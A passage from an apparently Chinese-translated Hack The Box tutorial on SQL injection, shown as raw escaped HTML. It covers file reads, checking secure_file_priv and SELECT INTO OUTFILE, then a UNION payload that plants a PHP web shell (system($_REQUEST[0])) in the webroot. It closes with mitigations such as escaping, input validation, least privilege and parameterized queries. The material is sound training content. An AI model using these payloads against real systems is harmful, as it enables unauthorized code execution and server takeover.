-</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/1alxqy.png\" alt=\"img\"></p>\n<p>但是，该页面最终会在浏览器中呈现 HTML 代码。可以通过点击查看 HTML 源代码<code>[Ctrl + U]</code>。</p>\n<p><img src=\"https://p.ipic.vip/e0u51d.png\" alt=\"加载文件源\"></p>\n<p>源代码向我们展示了完整的 PHP 代码，可以对其进行进一步检查以查找敏感信息（如数据库连接凭据）或查找更多漏洞。</p>\n<h2 id=\"0x11-写入文件\"><a href=\"#0x11-写入文件\" class=\"headerlink\" title=\"0x11 写入文件\"></a>0x11 写入文件</h2><p>当涉及到将文件写入后端服务器时，它在现代 DBMS 中变得更加受限，因为我们可以利用它在远程服务器上编写一个 web shell，从而执行代码并接管服务器。这就是现代 DBMS 默认禁用文件写入并要求 DBA 具有某些权限才能写入文件的原因。在写文件之前，我们首先要检查自己是否有足够的权限，DBMS是否允许写文件。</p>\n<hr>\n<h3 id=\"写文件权限\"><a href=\"#写文件权限\" class=\"headerlink\" title=\"写文件权限\"></a>写文件权限</h3><p>为了能够使用 MySQL 数据库将文件写入后端服务器，我们需要三件事：</p>\n<ol>\n<li><code>FILE</code>启用权限的用户</li>\n<li><code>secure_file_priv</code>未启用MySQL 全局变量</li>\n<li>对后端服务器上我们要写入的位置的写入权限</li>\n</ol>\n<p>我们已经发现我们的当前用户具有<code>FILE</code>写入文件所需的权限。我们现在必须检查 MySQL 数据库是否具有该权限。这可以通过检查全局变量来完成<code>secure_file_priv</code>。</p>\n<h5 id=\"secure-file-priv\"><a href=\"#secure-file-priv\" class=\"headerlink\" title=\"secure_file_priv\"></a>secure_file_priv</h5><p><a href=\"https://mariadb.com/kb/en/server-system-variables/#secure_file_priv\">secure_file_priv</a>变量用于确定从何处读取&#x2F;写入文件。一个空值可以让我们从整个文件系统中读取文件。否则，如果设置了某个目录，我们只能从变量指定的文件夹中读取。另一方面，<code>NULL</code>意味着我们不能从任何目录读&#x2F;写。MariaDB 将此变量默认设置为空，如果用户有权限，这允许我们读&#x2F;写任何文件<code>FILE</code>。但是，<code>MySQL</code>用作<code>/var/lib/mysql-files</code>默认文件夹。这意味着<code>MySQL</code>使用默认设置无法通过注入读取文件。更糟糕的是，一些现代配置默认为<code>NULL</code>，这意味着我们无法在系统内的任何地方读取&#x2F;写入文件。</p>\n<p>那么，让我们看看如何找出 的值<code>secure_file_priv</code>。在 中<code>MySQL</code>，我们可以使用以下查询来获取此变量的值：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SHOW</span> VARIABLES <span class=\"keyword\">LIKE</span> <span class=\"string\">&#x27;secure_file_priv&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>但是，由于我们正在使用<code>UNION</code>注入，因此我们必须使用语句来获取值<code>SELECT</code>。这应该不是问题，因为所有变量和大多数配置都存储在<code>INFORMATION_SCHEMA</code>数据库中。<code>MySQL</code>全局变量存储在一个名为<a href=\"https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html\">global_variables 的</a>表中，根据文档，该表有两列<code>variable_name</code>和<code>variable_value</code>。</p>\n<p>我们必须从<code>INFORMATION_SCHEMA</code>数据库中的那个表中选择这两列。MySQL 配置中有数百个全局变量，我们不想检索所有这些变量。<code>secure_file_priv</code>然后，我们将使用<code>WHERE</code>我们在上一节中学到的子句过滤结果以仅显示变量。</p>\n<p>最终的 SQL 查询如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> variable_name, variable_value <span class=\"keyword\">FROM</span> information_schema.global_variables <span class=\"keyword\">where</span> variable_name<span class=\"operator\">=</span>&quot;secure_file_priv&quot;</span><br></pre></td></tr></table></figure>\n\n<p>因此，与其他注入查询类似<code>UNION</code>，我们可以使用以下 payload 获得上述查询结果。请记住再添加两列<code>1</code>&amp;<code>4</code>作为垃圾数据，总共有 4 列’：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/h557d4.jpg\" alt=\"img\"></p>\n<p>结果显示该<code>secure_file_priv</code>值为空，这意味着我们可以将文件读&#x2F;写到任何位置。</p>\n<hr>\n<h3 id=\"选择进入-OUTFILE\"><a href=\"#选择进入-OUTFILE\" class=\"headerlink\" title=\"选择进入 OUTFILE\"></a>选择进入 OUTFILE</h3><p>现在我们已经确认我们的用户应该将文件写入后端服务器，让我们尝试使用语句来做到这一点<code>SELECT .. INTO OUTFILE</code>。SELECT <a href=\"https://mariadb.com/kb/en/select-into-outfile/\">INTO OUTFILE</a>语句可用于将来自选择查询的数据写入文件。这通常用于从表中导出数据。</p>\n<p>要使用它，我们可以<code>INTO OUTFILE &#39;...&#39;</code>在查询之后添加以将结果导出到我们指定的文件中。下面的示例将表的输出保存<code>users</code>到文件中<code>/tmp/credentials</code>：</p>\n<p> secure_file_priv</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT * from users INTO OUTFILE &#x27;/tmp/credentials&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>如果我们转到后端服务器和<code>cat</code>文件，我们会看到该表的内容：</p>\n<p> secure_file_priv</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sl1aun@htb[/htb]$ cat /tmp/credentials </span><br><span class=\"line\"></span><br><span class=\"line\">1       admin   392037dbba51f692776d6cefb6dd546d</span><br><span class=\"line\">2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f</span><br></pre></td></tr></table></figure>\n\n<p>也可以直接将<code>SELECT</code>字符串写入文件，让我们可以向后端服务器写入任意文件。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"string\">&#x27;this is a test&#x27;</span> <span class=\"keyword\">INTO</span> OUTFILE <span class=\"string\">&#x27;/tmp/test.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>当我们<code>cat</code>打开文件时，我们会看到该文本：</p>\n<p> secure_file_priv</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sl1aun@htb[/htb]$ cat /tmp/test.txt </span><br><span class=\"line\"></span><br><span class=\"line\">this is a test</span><br></pre></td></tr></table></figure>\n\n<p> secure_file_priv</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sl1aun@htb[/htb]$ ls -la /tmp/test.txt </span><br><span class=\"line\"></span><br><span class=\"line\">-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt</span><br></pre></td></tr></table></figure>\n\n<p>正如我们在上面看到的，该<code>test.txt</code>文件已成功创建并归<code>mysql</code>用户所有。</p>\n<p>提示：高级文件导出利用“FROM_BASE64(“base64_data”)”函数，以便能够写入长文件&#x2F;高级文件，包括二进制数据。</p>\n<hr>\n<h3 id=\"通过-SQL-注入写入文件\"><a href=\"#通过-SQL-注入写入文件\" class=\"headerlink\" title=\"通过 SQL 注入写入文件\"></a>通过 SQL 注入写入文件</h3><p>让我们尝试向 webroot 写入一个文本文件并验证我们是否具有写入权限。下面的查询应该写入<code>file written successfully!</code>文件<code>/var/www/html/proof.txt</code>，然后我们可以在 Web 应用程序上访问该文件：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"string\">&#x27;file written successfully!&#x27;</span> <span class=\"keyword\">into</span> outfile <span class=\"string\">&#x27;/var/www/html/proof.txt&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>注意：</strong>要编写 web shell，我们必须知道 web 服务器的基本 web 目录（即 web root）。找到它的一种方法是使用<code>load_file</code>读取服务器配置，例如在 找到 Apache 的配置<code>/etc/apache2/apache2.conf</code>，在 找到 Nginx 的配置<code>/etc/nginx/nginx.conf</code>，或者在 找到 IIS 配置<code>%WinDir%\\System32\\Inetsrv\\Config\\ApplicationHost.config</code>，或者我们可以在线搜索其他可能的配置位置。此外，我们可能会运行模糊扫描并尝试将文件写入不同的可能的 Web 根目录，使用<a href=\"https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt\">这个 Linux 的词表</a>或<a href=\"https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt\">这个 Windows 的词表</a>。最后，如果以上方法都不起作用，我们可以使用显示给我们的服务器错误并尝试以这种方式找到 web 目录。</p>\n<p>注入<code>UNION</code>有效载荷如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; union select 1,&#x27;</span>file written successfully<span class=\"operator\">!</span><span class=\"string\">&#x27;,3,4 into outfile &#x27;</span><span class=\"operator\">/</span>var<span class=\"operator\">/</span>www<span class=\"operator\">/</span>html<span class=\"operator\">/</span>proof.txt<span class=\"string\">&#x27;-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/hkrsmg.png\" alt=\"img\"></p>\n<p>我们在页面上没有看到任何错误，这表明查询成功了。<code>proof.txt</code>检查webroot 中的文件，我们看到它确实存在：</p>\n<p><img src=\"https://p.ipic.vip/40z8r3.png\" alt=\"img\"></p>\n<p>注意：我们看到我们转储的字符串以及前面的“1”、“3”和后面的“4”。这是因为整个“UNION”查询结果都写入了文件。为了使输出更清晰，我们可以使用 “” 而不是数字。</p>\n<hr>\n<h3 id=\"编写网络外壳\"><a href=\"#编写网络外壳\" class=\"headerlink\" title=\"编写网络外壳\"></a>编写网络外壳</h3><p>确认写入权限后，我们可以继续将 PHP web shell 写入 webroot 文件夹。我们可以编写如下的PHP webshell来直接在后台服务器上执行命令：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"number\">0</span>]); <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>我们可以重用我们之前的<code>UNION</code>注入载荷，并将字符串更改为上面的字符串，并将文件名更改为<code>shell.php</code>：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cn<span class=\"string\">&#x27; union select &quot;&quot;,&#x27;</span><span class=\"operator\">&lt;</span>?php <span class=\"keyword\">system</span>($_REQUEST[<span class=\"number\">0</span>]); ?<span class=\"operator\">&gt;</span><span class=\"string\">&#x27;, &quot;&quot;, &quot;&quot; into outfile &#x27;</span><span class=\"operator\">/</span>var<span class=\"operator\">/</span>www<span class=\"operator\">/</span>html<span class=\"operator\">/</span>shell.php<span class=\"string\">&#x27;-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>  ‘, “ “, “ “ 进入输出文件 ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php’– -‘&gt;</p>\n<p><img src=\"https://p.ipic.vip/ur051n.png\" alt=\"img\"></p>\n<p>再一次，我们没有看到任何错误，这意味着文件写入可能有效。<code>/shell.php</code>这可以通过浏览到文件并通过参数执行命令来验证<code>0</code>，<code>?0=id</code>在我们的 URL 中：</p>\n<p><img src=\"https://p.ipic.vip/2kzupt.png\" alt=\"img\"></p>\n<p>该<code>id</code>命令的输出确认我们执行了代码并以用户身份运行<code>www-data</code>。</p>\n<h2 id=\"0x12-缓解-SQL-注入\"><a href=\"#0x12-缓解-SQL-注入\" class=\"headerlink\" title=\"0x12 缓解 SQL 注入\"></a>0x12 缓解 SQL 注入</h2><hr>\n<p>我们已经了解了 SQL 注入、它们发生的原因以及我们如何利用它们。我们还应该学习如何在我们的代码中避免这些类型的漏洞，并在发现它们时对其进行修补。让我们看一些如何缓解 SQL 注入的示例。</p>\n<hr>\n<h3 id=\"输入消毒\"><a href=\"#输入消毒\" class=\"headerlink\" title=\"输入消毒\"></a>输入消毒</h3><p>这是我们之前讨论的身份验证绕过部分的代码片段：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;SNIP&gt;</span><br><span class=\"line\">  <span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">  <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$query</span> = <span class=\"string\">&quot;SELECT * FROM logins WHERE username=&#x27;&quot;</span>. <span class=\"variable\">$username</span>. <span class=\"string\">&quot;&#x27; AND password = &#x27;&quot;</span> . <span class=\"variable\">$password</span> . <span class=\"string\">&quot;&#x27;;&quot;</span> ;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Executing query: &quot;</span> . <span class=\"variable\">$query</span> . <span class=\"string\">&quot;&lt;br /&gt;&lt;br /&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"variable\">$conn</span> ,<span class=\"variable\">$query</span>))</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">          <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Error: &#x27;</span> . <span class=\"title function_ invoke__\">mysqli_error</span>(<span class=\"variable\">$conn</span>));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"variable\">$conn</span>, <span class=\"variable\">$query</span>);</span><br><span class=\"line\">  <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysqli_fetch_array</span>(<span class=\"variable\">$result</span>);</span><br><span class=\"line\">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>\n\n<p>正如我们所看到的，脚本从 POST 请求中获取 和 并将其直接传递给查询<code>username</code>。<code>password</code>这将使攻击者可以注入他们想要的任何东西并利用该应用程序。可以通过清理任何用户输入来避免注入，使注入的查询无用。库提供了多种函数来实现这一点，一个这样的例子是<a href=\"https://www.php.net/manual/en/mysqli.real-escape-string.php\">mysqli_real_escape_string()</a>函数。此函数对诸如<code>&#39;</code>and之类的字符进行转义<code>&quot;</code>，因此它们没有任何特殊含义。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;SNIP&gt;</span><br><span class=\"line\"><span class=\"variable\">$username</span> = <span class=\"title function_ invoke__\">mysqli_real_escape_string</span>(<span class=\"variable\">$conn</span>, <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$password</span> = <span class=\"title function_ invoke__\">mysqli_real_escape_string</span>(<span class=\"variable\">$conn</span>, <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$query</span> = <span class=\"string\">&quot;SELECT * FROM logins WHERE username=&#x27;&quot;</span>. <span class=\"variable\">$username</span>. <span class=\"string\">&quot;&#x27; AND password = &#x27;&quot;</span> . <span class=\"variable\">$password</span> . <span class=\"string\">&quot;&#x27;;&quot;</span> ;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;Executing query: &quot;</span> . <span class=\"variable\">$query</span> . <span class=\"string\">&quot;&lt;br /&gt;&lt;br /&gt;&quot;</span>;</span><br><span class=\"line\">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>\n\n<p>上面的代码片段显示了如何使用该函数。</p>\n<p><img src=\"https://p.ipic.vip/chzyde.png\" alt=\"mysqli_escape\"></p>\n<p>正如预期的那样，由于转义了单引号，注入不再有效。一个类似的例子是用于转义 PostgreSQL 查询的<a href=\"https://www.php.net/manual/en/function.pg-escape-string.php\">pg_escape_string() 。</a></p>\n<hr>\n<h3 id=\"输入验证\"><a href=\"#输入验证\" class=\"headerlink\" title=\"输入验证\"></a>输入验证</h3><p>还可以根据用于查询的数据验证用户输入，以确保它与预期输入相匹配。例如，当将电子邮件作为输入时，我们可以验证输入的形式是<code>...@email.com</code>，等等。</p>\n<p>考虑端口页面中的以下代码片段，我们<code>UNION</code>在其中使用了注入：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;port_code&quot;</span>])) &#123;</span><br><span class=\"line\">\t<span class=\"variable\">$q</span> = <span class=\"string\">&quot;Select * from ports where port_code ilike &#x27;%&quot;</span> . <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;port_code&quot;</span>] . <span class=\"string\">&quot;%&#x27;&quot;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">pg_query</span>(<span class=\"variable\">$conn</span>,<span class=\"variable\">$q</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!<span class=\"variable\">$result</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">   \t\t<span class=\"keyword\">die</span>(<span class=\"string\">&quot;&lt;/table&gt;&lt;/div&gt;&lt;p style=&#x27;font-size: 15px;&#x27;&gt;&quot;</span> . <span class=\"title function_ invoke__\">pg_last_error</span>(<span class=\"variable\">$conn</span>). <span class=\"string\">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&lt;SNIP&gt;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><code>port_code</code>我们看到直接在查询中使用了GET 参数。众所周知，端口号仅由字母或空格组成。我们可以将用户输入限制为仅这些字符，这将防止注入查询。正则表达式可用于验证输入：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;SNIP&gt;</span><br><span class=\"line\"><span class=\"variable\">$pattern</span> = <span class=\"string\">&quot;/^[A-Za-z\\s]+$/&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$code</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;port_code&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>, <span class=\"variable\">$code</span>)) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;&lt;/table&gt;&lt;/div&gt;&lt;p style=&#x27;font-size: 15px;&#x27;&gt;Invalid input! Please try again.&lt;/p&gt;&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$q</span> = <span class=\"string\">&quot;Select * from ports where port_code ilike &#x27;%&quot;</span> . <span class=\"variable\">$code</span> . <span class=\"string\">&quot;%&#x27;&quot;</span>;</span><br><span class=\"line\">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>\n\n<p>代码被修改为使用<a href=\"https://www.php.net/manual/en/function.preg-match.php\">preg_match()</a>函数，该函数检查输入是否与给定模式匹配。使用的模式是<code>[A-Za-z\\s]+</code>，它将只匹配包含字母和空格的字符串。任何其他字符都将导致脚本终止。</p>\n<p><img src=\"https://p.ipic.vip/xgrdd8.png\" alt=\"img\"></p>\n<p>我们可以测试下面的注入：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;; SELECT 1,2,3,4-- -</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p.ipic.vip/xgrdd8.png\" alt=\"img\"></p>\n<p>如上图所示，注入查询的输入被服务器拒绝。</p>\n<hr>\n<h3 id=\"用户权限-1\"><a href=\"#用户权限-1\" class=\"headerlink\" title=\"用户权限\"></a>用户权限</h3><p>正如最初讨论的那样，DBMS 软件允许创建具有细粒度权限的用户。我们应该确保查询数据库的用户只有最小权限。</p>\n<p>超级用户和具有管理权限的用户永远不应该与 Web 应用程序一起使用。这些帐户可以访问可能导致服务器受损的功能和特性。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MariaDB [(none)]&gt; CREATE USER &#x27;reader&#x27;@&#x27;localhost&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">Query OK, 0 rows affected (0.002 sec)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [(none)]&gt; GRANT SELECT ON ilfreight.ports TO &#x27;reader&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;p@ssw0Rd!!&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">Query OK, 0 rows affected (0.000 sec)</span><br></pre></td></tr></table></figure>\n\n<p>上面的命令添加了一个名为 who 的新 MariaDB 用户，<code>reader</code>该用户仅被授予<code>SELECT</code>表的权限<code>ports</code>。我们可以通过登录验证该用户的权限：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sl1aun@htb[/htb]$ mysql -u reader -p</span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [(none)]&gt; use ilfreight;</span><br><span class=\"line\">MariaDB [ilfreight]&gt; SHOW TABLES;</span><br><span class=\"line\"></span><br><span class=\"line\">+---------------------+</span><br><span class=\"line\">| Tables_in_ilfreight |</span><br><span class=\"line\">+---------------------+</span><br><span class=\"line\">| ports               |</span><br><span class=\"line\">+---------------------+</span><br><span class=\"line\">1 row in set (0.000 sec)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [ilfreight]&gt; SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;</span><br><span class=\"line\"></span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">| SCHEMA_NAME        |</span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">| information_schema |</span><br><span class=\"line\">| ilfreight          |</span><br><span class=\"line\">+--------------------+</span><br><span class=\"line\">2 rows in set (0.000 sec)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [ilfreight]&gt; SELECT * FROM ilfreight.credentials;</span><br><span class=\"line\">ERROR 1142 (42000): SELECT command denied to user &#x27;reader&#x27;@&#x27;localhost&#x27; for table &#x27;credentials&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>上面的代码片段确认<code>reader</code>用户无法查询<code>ilfreight</code>数据库中的其他表。用户只能访问<code>ports</code>应用程序所需的表。</p>\n<hr>\n<h3 id=\"Web-应用防火墙\"><a href=\"#Web-应用防火墙\" class=\"headerlink\" title=\"Web 应用防火墙\"></a>Web 应用防火墙</h3><p>Web 应用程序防火墙 (WAF) 用于检测恶意输入并拒绝包含它们的任何 HTTP 请求。即使应用程序逻辑存在缺陷，这也有助于防止 SQL 注入。WAF 可以是开源的 (ModSecurity) 或高级的 (Cloudflare)。他们中的大多数都有基于常见网络攻击配置的默认规则。例如，任何包含该字符串的请求<code>INFORMATION_SCHEMA</code>都将被拒绝，因为它通常在利用 SQL 注入时使用。</p>\n<hr>\n<h3 id=\"参数化查询\"><a href=\"#参数化查询\" class=\"headerlink\" title=\"参数化查询\"></a>参数化查询</h3><p>另一种确保输入被安全清理的方法是使用参数化查询。参数化查询包含输入数据的占位符，然后由驱动程序转义并传递。我们不是直接将数据传递到 SQL 查询，而是使用占位符，然后用 PHP 函数填充它们。</p>\n<p>考虑以下修改后的代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;SNIP&gt;</span><br><span class=\"line\">  <span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">  <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$query</span> = <span class=\"string\">&quot;SELECT * FROM logins WHERE username=? AND password = ?&quot;</span> ;</span><br><span class=\"line\">  <span class=\"variable\">$stmt</span> = <span class=\"title function_ invoke__\">mysqli_prepare</span>(<span class=\"variable\">$conn</span>, <span class=\"variable\">$query</span>);</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">mysqli_stmt_bind_param</span>(<span class=\"variable\">$stmt</span>, <span class=\"string\">&#x27;ss&#x27;</span>, <span class=\"variable\">$username</span>, <span class=\"variable\">$password</span>);</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">mysqli_stmt_execute</span>(<span class=\"variable\">$stmt</span>);</span><br><span class=\"line\">  <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysqli_stmt_get_result</span>(<span class=\"variable\">$stmt</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysqli_fetch_array</span>(<span class=\"variable\">$result</span>);</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">mysqli_stmt_close</span>(<span class=\"variable\">$stmt</span>);</span><br><span class=\"line\">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>\n\n<p>查询被修改为包含两个占位符，标有用<code>?</code>户名和密码的放置位置。<a href=\"https://www.php.net/manual/en/mysqli-stmt.bind-param.php\">然后我们使用mysqli_stmt_bind_param()</a>函数将用户名和密码绑定到查询。这将安全地转义任何引号并将值放入查询中。</p>\n<hr>\n<h3 id=\"结论\"><a 